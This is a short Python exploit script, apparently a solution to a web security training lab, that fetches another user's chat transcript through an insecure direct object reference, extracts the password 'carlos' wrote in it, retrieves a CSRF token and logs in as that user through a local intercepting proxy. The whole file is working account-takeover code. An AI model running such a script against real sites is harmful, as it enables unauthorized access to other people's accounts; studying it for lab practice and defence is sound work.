#!/usr/bin/env python3
import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def read_message_1(s, url):
    message_url = url + "/download-transcript/1.txt"
    r = s.get(message_url, verify=False, proxies=proxies)
    if "password" in r.text:
        print("[*] Retrieving 1.txt message...")
    carlos_pass = re.search(r"my password is ([a-zA-Z0-9]+)", r.text).group(1)
    carlos_pass = carlos_pass.strip()
    print(f"[+] Discovered password: {carlos_pass}")
    if "password" in r.text:
        return carlos_pass
    return False


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "csrf"})
    if token:
        return token["value"]
    return None


def login_as_carlos(s, url, username):
    login_page = url + "/login"
    csrf = get_csrf_token(s, login_page)
    carlos_pass = read_message_1(s, url)
    data = {"username": username, "password": carlos_pass}
    if csrf:
        data["csrf"] = csrf
    r = s.post(login_page, data=data, verify=False, allow_redirects=True, proxies=proxies, timeout=10)
    if "Log out" in r.text:
        return True
    return False    

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    if not login_as_carlos(s, url, "carlos"):
        print("[-] Login failed")
        return
    print("[+] Logged in as carlos, lab solved.")

if __name__ == "__main__":
    main()
